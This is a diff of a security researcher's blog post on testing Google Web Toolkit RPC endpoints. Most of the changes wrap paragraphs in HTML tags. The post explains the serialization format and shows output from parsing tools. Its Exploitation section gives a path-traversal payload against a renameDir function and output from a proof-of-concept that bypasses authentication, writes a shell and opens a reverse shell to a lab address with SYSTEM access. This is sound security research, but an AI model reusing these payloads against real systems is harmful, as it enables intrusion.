@@ -7,17 +7,18 @@ excerpt_separator: <!--more-->
 ---
 
 <img class="excel" alt="Google Web Toolkit" src="/assets/images/gwt.png">
-Recently I have been looking for vulnerabilities in a target that has some API's developed with the Google Web Toolkit framework. This is the second time I've come up against a target using this technology so I figured it was about time I took some notes.
+<p class="cn" markdown="1">Recently I have been looking for vulnerabilities in a target that has some API's developed with the Google Web Toolkit framework. This is the second time I've come up against a target using this technology so I figured it was about time I took some notes.</p>
 
-Its sufficient to say, that I have finally upheld my word. This blog post is more of a reference to my future self, but if some people get something out of it, then more power to them!
+<p class="cn" markdown="1">Its sufficient to say, that I have finally upheld my word. This blog post is more of a reference to my future self, but if some people get something out of it, then more power to them!</p>
 <!--more-->
 
-TL;DR
+<p class="cn" markdown="1">TL;DR</p>
 
-I developed a tool that will blindly fingerprint a non-obfuscated GWT cache file and generate basic GWT serialized strings, ready for auditing. You can read the [Conclusion](#conclude) and get the code.
+<p class="cn" markdown="1">I developed a tool that will blindly fingerprint a non-obfuscated GWT cache file and generate basic GWT serialized strings, ready for auditing. You can read the [Conclusion](#conclude) and get the code.</p>
 
 ### Overview
 
+<div class="cn" markdown="1">
 - [Past Research](#research)
 - [Examples of GWT-RPC requests](#examples)
    - [Single parameter: String](#1)
@@ -30,20 +31,21 @@ I developed a tool that will blindly fingerprint a non-obfuscated GWT cache file
 - [Parsing](#parse)
 - [Exploitation](#exploits)
 - [Conclusion](#conclude)
+</div>
 
-Before we begin, lets take a quick look at some past research.
+<p class="cn" markdown="1">Before we begin, lets take a quick look at some past research.</p>
 
 ### Past Research
 
-Ron Gutierrez presented some research titled ["Unlocking the Toolkit"][attackinggwt] and developed some [tools][toolkit] that parse serialized GWT strings and discover functions from remote. Other's such as Brian Slesinsky have developed a document detailing the [GWT-RPC wire protocol][gwtrpc] and even has a [google group][group] dedicated to GWT users.
+<p class="cn" markdown="1">Ron Gutierrez presented some research titled ["Unlocking the Toolkit"][attackinggwt] and developed some [tools][toolkit] that parse serialized GWT strings and discover functions from remote. Other's such as Brian Slesinsky have developed a document detailing the [GWT-RPC wire protocol][gwtrpc] and even has a [google group][group] dedicated to GWT users.</p>
 
 ### <a id="examples"></a>Examples of GWT-RPC requests
 
-Let's first see a few examples so that we can understand this protocol a little better.
+<p class="cn" markdown="1">Let's first see a few examples so that we can understand this protocol a little better.</p>
 
 #### <a id="1"></a>Single parameter: String
 
-Here is a request that that sends a single String as the value `test`.
+<p class="cn" markdown="1">Here is a request that that sends a single String as the value `test`.</p>
 
 {% highlight text hl_lines="9" %}
 POST /helloworld/greet HTTP/1.1
@@ -57,7 +59,7 @@ Connection: close
 7|0|6|http://127.0.0.1:8888/helloworld/|95F17E12D4B90695D035873A418208A8|com.example.test.client.GreetingService|greetServer|java.lang.String/2004016611|test|1|2|3|4|1|5|6|
 {% endhighlight %}
 
-We can examine what is happening if we break down the serialized string by pipe `|`.
+<p class="cn" markdown="1">We can examine what is happening if we break down the serialized string by pipe `|`.</p>
 
 - `7` is the stream version.
 - `0` is the flags.
@@ -72,7 +74,7 @@ We can examine what is happening if we break down the serialized string by pipe 
 - `1` is the number of arguments to the function
 - `5|6` is the parameter type and value (java.lang.String/2004016611 and test)
 
-Here is the corrosponding function implimentation:
+<p class="cn" markdown="1">Here is the corrosponding function implimentation:</p>
 
 {% highlight java %}
 @RemoteServiceRelativePath("greet")
@@ -83,7 +85,7 @@ public interface GreetingService extends RemoteService {
 
 #### <a id="2"></a>Single parameter: ArrayList
 
-Here is a request that that sends a single List of type ArrayList containing a String value `test`.
+<p class="cn" markdown="1">Here is a request that that sends a single List of type ArrayList containing a String value `test`.</p>
 
 {% highlight text hl_lines="9" %}
 POST /helloworld/greet HTTP/1.1
@@ -97,8 +99,9 @@ Connection: close
 7|0|8|http://127.0.0.1:8888/helloworld/|0AA7A0C25ADF167CC648926141094922|com.example.test.client.GreetingService|greetServer|java.util.List|java.util.ArrayList/4159755760|java.lang.String/2004016611|test|1|2|3|4|1|5|6|1|7|8|
 {% endhighlight %}
 
-Again, we can examine what is happening if we break down the serialized string. We will skip up to the function name, since we know what those values are already:
+<p class="cn" markdown="1">Again, we can examine what is happening if we break down the serialized string. We will skip up to the function name, since we know what those values are already:</p>
 
+<div class="cn" markdown="1">
 - `8` is the number of strings in the serialized request
 - `java.util.List` is the first variable. Since it is a list, the next parameter specifies the type that is accepted.
 - `java.util.ArrayList/4159755760` is the List implimentation that is accepted by the client interface.
@@ -109,8 +112,9 @@ Again, we can examine what is happening if we break down the serialized string. 
 - `5|6` is the List and ArrayList implimentation (java.util.List and java.util.ArrayList/4159755760 values)
 - `1` is the number of elements in the ArrayList
 - `7|8` is the ArrayList type and its elements.
+</div>
 
-Here is the corrosponding function implimentation:
+<p class="cn" markdown="1">Here is the corrosponding function implimentation:</p>
 
 {% highlight java %}
 @RemoteServiceRelativePath("greet")
@@ -121,7 +125,7 @@ public interface GreetingService extends RemoteService {
 
 #### <a id="3"></a>Multiple parameters: ArrayList, String
 
-So, what if we send multiple parameters? Let's use the following example:
+<p class="cn" markdown="1">So, what if we send multiple parameters? Let's use the following example:</p>
 
 {% highlight text hl_lines="9" %}
 POST /helloworld/greet HTTP/1.1
@@ -135,11 +139,13 @@ Connection: close
 7|0|9|http://127.0.0.1:8888/helloworld/|0AA7A0C25ADF167CC648926141094922|com.example.test.client.GreetingService|greetServer|java.util.List|java.lang.String/2004016611|java.util.ArrayList/4159755760|GWT User|wtf|1|2|3|4|2|5|6|7|1|6|8|9|
 {% endhighlight %}
 
-This is the same example above, the only difference is that the addition of a string argument.
+<p class="cn" markdown="1">This is the same example above, the only difference is that the addition of a string argument.</p>
 
+<div class="cn" markdown="1">
 - `9` is the number of strings in the serialized request
 - `2` is now the number of arguments to the function
 - `9` is the extra String value
+</div>
 
 {% highlight java %}
 @RemoteServiceRelativePath("greet")
@@ -150,7 +156,7 @@ public interface GreetingService extends RemoteService {
 
 #### <a id="4"></a>Multiple parameters: Integer, ArrayList
 
-So, what if we send multiple parameters? Let's use the following example for 
+<p class="cn" markdown="1">So, what if we send multiple parameters? Let's use the following example:</p>
 
 {% highlight text hl_lines="9" %}
 POST /helloworld/greet HTTP/1.1
@@ -164,8 +170,9 @@ Connection: close
 7|0|9|http://127.0.0.1:8888/helloworld/|43127AF533854D6F99980CB5572AEC0E|com.example.test.client.GreetingService|greetServer|java.lang.Integer/3438268394|java.util.List|java.util.ArrayList/4159755760|java.lang.String/2004016611|test|1|2|3|4|2|5|6|5|99|7|1|8|9|
 {% endhighlight %}
 
-This is the same example above, the only difference is that an Integer type is used and it is now the first parameter.
+<p class="cn" markdown="1">This is the same example above, the only difference is that an Integer type is used and it is now the first parameter.</p>
 
+<div class="cn" markdown="1">
 - `9` is the number of strings in the serialized request
 - `2` is now the number of arguments to the function
 - `5|6` are the arguments to the function (java.lang.Integer/3438268394, java.util.List)
@@ -175,6 +182,7 @@ This is the same example above, the only difference is that an Integer type is u
 - `1` is the number of elements in the ArrayList.
 - `8` is the ArrayList type (`ArrayList<String>`, referencing java.lang.String/2004016611)
 - `9` is the elements value (test) 
+</div>
 
 {% highlight java %}
 @RemoteServiceRelativePath("greet")
@@ -185,7 +193,7 @@ public interface GreetingService extends RemoteService {
 
 #### <a id="5"></a>Multiple parameters: Long, ArrayList (with multiple elements)
 
-So, what if we send multiple elements in our ArrayList and throw in a Long for good measure?
+<p class="cn" markdown="1">So, what if we send multiple elements in our ArrayList and throw in a Long for good measure?</p>
 
 {% highlight text hl_lines="9" %}
 POST /helloworld/greet HTTP/1.1
@@ -199,8 +207,9 @@ Connection: close
 7|0|10|http://127.0.0.1:8888/helloworld/|5BA0C1B0BB61A2FFF68C4B4FAE5F9D16|com.example.test.client.GreetingService|greetServer|java.lang.Long/4227064769|java.util.List|java.util.ArrayList/4159755760|java.lang.String/2004016611|test1|test2|1|2|3|4|2|5|6|5|D4O|7|2|8|9|8|10|
 {% endhighlight %}
 
-This is the same example above, the only difference is that an Long type is used there are now multiple elements in the ArrayList.
+<p class="cn" markdown="1">This is the same example above, the only difference is that an Long type is used there are now multiple elements in the ArrayList.</p>
 
+<div class="cn" markdown="1">
 - `10` is the number of strings in the serialized request
 - `2` there are 2 arguments to the function
 - `5|6` are the arguments to the function (java.lang.Long/4227064769, java.util.List)
@@ -212,6 +221,7 @@ This is the same example above, the only difference is that an Long type is used
 - `9` is the first element value (test1) 
 - `8` is the ArrayList type (`ArrayList<String>`, referencing java.lang.String/2004016611)
 - `10` is the second element value (test2)
+</div>
 
 {% highlight java %}
 @RemoteServiceRelativePath("greet")
@@ -220,7 +230,7 @@ public interface GreetingService extends RemoteService {
 }
 {% endhighlight %}
 
-So, what is the `D40` Long value? It turns out that its an base64 [RFC-4648][rfc] implimentation of the Long value. It can be decoded with a little python:
+<p class="cn" markdown="1">So, what is the `D40` Long value? It turns out that its an base64 [RFC-4648][rfc] implimentation of the Long value. It can be decoded with a little python:</p>
 
 {% highlight python %}
 #!/usr/local/bin/python
@@ -253,19 +263,19 @@ saturn:~ mr_me$ ./poc.py D4O
 15886
 {% endhighlight %}
 
-This means that 15886 was the long value sent to this function on the server-side.
+<p class="cn" markdown="1">This means that 15886 was the long value sent to this function on the server-side.</p>
 
 #### <a id="6"></a>Single parameter: Person (Java complex type)
 
-Check out the excellent example [here][example] for learning how to serialize complex data types. Note that if you wish to send custom complex types to GWT endpoints, you will need to audit the source code of the target. Performing a white-box test is a requirement in that case so that you can determine the custom object's properties.
+<p class="cn" markdown="1">Check out the excellent example [here][example] for learning how to serialize complex data types. Note that if you wish to send custom complex types to GWT endpoints, you will need to audit the source code of the target. Performing a white-box test is a requirement in that case so that you can determine the custom object's properties.</p>
 
 ### <a id="toolz"></a>Tools
 
-The [GWT-Penetration-Testing-Toolset][toolkit] was developed by Ron as part of his research. The tools work quite well.
+<p class="cn" markdown="1">The [GWT-Penetration-Testing-Toolset][toolkit] was developed by Ron as part of his research. The tools work quite well.</p>
 
 #### gwtparse
 
-This tool will take a serialized GWT string and attempt to parse it in order to find all the string locations in the rquest in order for us to test the server-side code for vulnerabilities. Nice is you **already** have a serialized string.
+<p class="cn" markdown="1">This tool will take a serialized GWT string and attempt to parse it in order to find all the string locations in the rquest in order for us to test the server-side code for vulnerabilities. Nice is you **already** have a serialized string.</p>
 
 ```bash
 saturn:gwtparse mr_me$ python gwtparse.py -b -p -i "7|0|10|http://127.0.0.1:8888/helloworld/|5BA0C1B0BB61A2FFF68C4B4FAE5F9D16|com.example.test.client.GreetingService|greetServer|java.lang.Long/4227064769|java.util.List|java.util.ArrayList/4159755760|java.lang.String/2004016611|test1|test2|1|2|3|4|2|5|6|5|99|7|2|8|9|8|10|"
@@ -301,11 +311,11 @@ GWT RPC Payload Fuzz String
 7|0|10|http://127.0.0.1:8888/helloworld/|5BA0C1B0BB61A2FFF68C4B4FAE5F9D16|com.example.test.client.GreetingService|greetServer|java.lang.Long/4227064769|java.util.List|java.util.ArrayList/4159755760|java.lang.String/2004016611|§test1§|§test2§|1|2|3|4|2|5|6|5|§99§|§7§|2|8|9|8|10|
 ```
 
-The -b burp option is nice. Your serialized string contains the § characters so you can plug the request straight into the intruder and vulnerability scan away.
+<p class="cn" markdown="1">The -b burp option is nice. Your serialized string contains the § characters so you can plug the request straight into the intruder and vulnerability scan away.</p>
 
 #### gwtenum
 
-After having to make some changes to the code to support HTTPS, it turns out that gwtenum.py only works on a few endpoints.
+<p class="cn" markdown="1">After having to make some changes to the code to support HTTPS, it turns out that gwtenum.py only works on a few endpoints.</p>
 
 ```bash
 saturn:gwtenum mr_me$ 
@@ -340,7 +350,7 @@ GettingOperatorGroupService.getDevDscr( java.lang.String/2004016611,java.util.Li
 GettingOperatorGroupService.turnGroupData( )
 ```
 
-This is because the code assumes an obfuscated format of the cache files. Here are examples of a few functions within the some_other_gwt's endpoint cache file.
+<p class="cn" markdown="1">This is because the code assumes an obfuscated format of the cache files. Here are examples of a few functions within the some_other_gwt's endpoint cache file.</p>
 
 {% highlight js %}
 function XK(b,c,d){return VK(c,d,UK(b,d),TK(b,d),null)}
@@ -357,7 +367,7 @@ function ywc(b){this.i=new Cu(this);this.j=b;this.c=pvd}
 function Ewc(b){this.i=new Cu(this);this.j=b;this.c=pvd}
 {% endhighlight %}
 
-When in reality, I was trying to parse the non-obfuscated **some_gwt's** cache file. Here is an example of a function within this cache file:
+<p class="cn" markdown="1">When in reality, I was trying to parse the non-obfuscated **some_gwt's** cache file. Here is an example of a function within this cache file:</p>
 
 {% highlight js %}
 function $renameDir(this$static, oldName, newName, callback){
@@ -385,7 +395,7 @@ function $renameDir(this$static, oldName, newName, callback){
 }
 {% endhighlight %}
 
-As you can see, the above JavaScript looks a little more strutured which will make it easier when we want to parse it. So I developed a parser that will also generate the GWT serialized string for these non-obfuscated cache files.
+<p class="cn" markdown="1">As you can see, the above JavaScript looks a little more strutured which will make it easier when we want to parse it. So I developed a parser that will also generate the GWT serialized string for these non-obfuscated cache files.</p>
 
 ### <a id="parse"></a>Parsing
 
@@ -530,7 +540,7 @@ saturn:~ mr_me$ ./gwt.py -c JSESSIONID:D6D5B3A7ECE0FEF704F93249A7AD3AF6 -u https
 (27) GWT: 6|0|18|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.SNMPService|set|xx.DeviceItem/394618249|java.util.List|java.util.ArrayList|java.lang.String|java.util.List|java.util.ArrayList|java.lang.String|java.util.List|java.util.ArrayList|java.lang.String|%s|%s|%s|%s|1|2|3|4|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|
 ```
 
-Quite mode also works:
+<p class="cn" markdown="1">Quite mode also works:</p>
 
 ```bash
 saturn:~ $ ./gwt.py -q -c JSESSIONID:D6D5B3A7ECE0FEF704F93249A7AD3AF6 -u https://abc.xyz/some_gwt/some_gwt.nocache.js
@@ -568,11 +578,11 @@ saturn:~ $ ./gwt.py -q -c JSESSIONID:D6D5B3A7ECE0FEF704F93249A7AD3AF6 -u https:/
 (27) function: set 
 ```
 
-So we can see that `gwt.py` will not parse cache files that are obfuscated, you will have to use `gwtenum.py` for that.
+<p class="cn" markdown="1">So we can see that `gwt.py` will not parse cache files that are obfuscated, you will have to use `gwtenum.py` for that.</p>
 
 #### <a id="exploits"></a>Exploitation
 
-Several functions were vulnerable to different types of attacks but one of the interesting functions I came across, was the renameDir function. This function either wasn't implimented in the actual UI of the target or at the very least I couldn't find it. This is not an issue because as long at the client MIBFileService class impliments it, we can reach it. We can use `gwt.py` to generate the GWT serialized string for us.
+<p class="cn" markdown="1">Several functions were vulnerable to different types of attacks but one of the interesting functions I came across, was the renameDir function. This function either wasn't implimented in the actual UI of the target or at the very least I couldn't find it. This is not an issue because as long at the client MIBFileService class impliments it, we can reach it. We can use `gwt.py` to generate the GWT serialized string for us.</p>
 
 ```bash
 (20) function: renameDir 
@@ -581,13 +591,13 @@ Several functions were vulnerable to different types of attacks but one of the i
 (20) GWT: 6|0|8|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|renameDir|java.lang.String/2004016611|java.lang.String/2004016611|%s|%s|1|2|3|4|2|5|6|7|8|
 ```
 
-The code tells us the parameters, **oldName** and **newName** so my natural instict is to try and attack the endpoint using traversals. I didn't even bother looking at the server-side code for this function.
+<p class="cn" markdown="1">The code tells us the parameters, **oldName** and **newName** so my natural instict is to try and attack the endpoint using traversals. I didn't even bother looking at the server-side code for this function.</p>
 
 ```
 6|0|8|https://abc.xyz/some_gwt/|EA595041C3D0ECAA75FAA7D8AAF0DE5A|xx.MIBFileService|renameDir|java.lang.String|java.lang.String|../../../../../from_some_folder|../../to_some_other_folder|1|2|3|4|2|5|6|7|8|
 ```
 
-After bypassing the authentication using other vulnerabilities, it turns out, I can leverage this to achieve remote code execution against my target.
+<p class="cn" markdown="1">After bypassing the authentication using other vulnerabilities, it turns out, I can leverage this to achieve remote code execution against my target.</p>
 
 ```
 saturn:~ mr_me$ ./poc.py 172.16.175.148 172.16.175.1:4444
@@ -598,10 +608,10 @@ saturn:~ mr_me$ ./poc.py 172.16.175.148 172.16.175.1:4444
 (1) bypassing authentication...
 (2) leaking a user session...
 (+) leaked session: D6D5B3A7ECE0FEF704F93249A7AD3AF6
-(+) leaking the viewState...
+(3) leaking the viewState...
 (4) writing a shell...
 (5) rewriting shell location...
-(+) executing shell...
+(6) executing shell...
 (+) starting handler on port 4444
 (+) connection from 172.16.175.148
 (+) pop thy shell!
@@ -615,20 +625,21 @@ nt authority\system
 C:\Windows\System32>
 ```
 
-This is possible because many applications allow users to upload potentially malicious files (think PHP, JSP, ASP, etc) with controlled/semi-controlled content, outside of the webroot.
+<p class="cn" markdown="1">This is possible because many applications allow users to upload potentially malicious files (think PHP, JSP, ASP, etc) with controlled/semi-controlled content, outside of the webroot.</p>
 
-The developer's mindset is that, if the code is outside of the webroot, in a fixed location, there is no way for an attacker to reach it. Using a [rename][CVE-2015-2606] primitive is a powerful way to achieve code execution, because it fully side steps the developers assumptions.
+<p class="cn" markdown="1">The developer's mindset is that, if the code is outside of the webroot, in a fixed location, there is no way for an attacker to reach it. Using a [rename][CVE-2015-2606] primitive is a powerful way to achieve code execution, because it fully side steps the developers assumptions.</p>
 
-So all we need to do is "rename" the directory, in reality, move the directory where our backdoor is into a web accessible location.
+<p class="cn" markdown="1">So all we need to do is "rename" the directory, in reality, move the directory where our backdoor is into a web accessible location.</p>
 
 #### <a id="conclude"></a>Conclusion
 
-Testing GWT from a white-box perspective is certainly easier than from a black-box. If you are testing from a white-box perspective, you can decompile the XYZService (client) and the XYZServiceImpl (server) classes and can discover all the implimented functions, their arguments and their type definitions.
+<p class="cn" markdown="1">Testing GWT from a white-box perspective is certainly easier than from a black-box. If you are testing from a white-box perspective, you can decompile the XYZService (client) and the XYZServiceImpl (server) classes and can discover all the implimented functions, their arguments and their type definitions.</p>
 
-However, unless we can directly interact with that service, we will still need to find a way to generate the GWT serialized strings to be able to test the endpoints.
+<p class="cn" markdown="1">However, unless we can directly interact with that service, we will still need to find a way to generate the GWT serialized strings to be able to test the endpoints.</p>
 
-Attacking GWT functions using primitive types in Java is typically easy enough, the complexity arises when the endpoint expects serialized complex types. You can download the `gwt.py` from the [github][gwt.py] account.
+<p class="cn" markdown="1">Attacking GWT functions using primitive types in Java is typically easy enough, the complexity arises when the endpoint expects serialized complex types. You can download the `gwt.py` from the [github][gwt.py] account.</p>
 
+<div class="cn" markdown="1">
 [attackinggwt]: https://www.owasp.org/images/7/77/Attacking_Google_Web_Toolkit.ppt
 [gwtrpc]: https://docs.google.com/document/d/1eG0YocsYYbNAtivkLtcaiEE5IOF5u4LUol8-LL0TIKU/
 [group]: https://groups.google.com/forum/?fromgroups#!forum/google-web-toolkit
@@ -637,3 +648,4 @@ Attacking GWT functions using primitive types in Java is typically easy enough, 
 [CVE-2015-2606]: http://www.zerodayinitiative.com/advisories/ZDI-15-352/
 [gwt.py]: https://github.com/sourceincite/tools/blob/master/gwt.py
 [example]: https://docs.google.com/document/d/1eG0YocsYYbNAtivkLtcaiEE5IOF5u4LUol8-LL0TIKU/edit#heading=h.nwvro3zaq0ks
+</div>
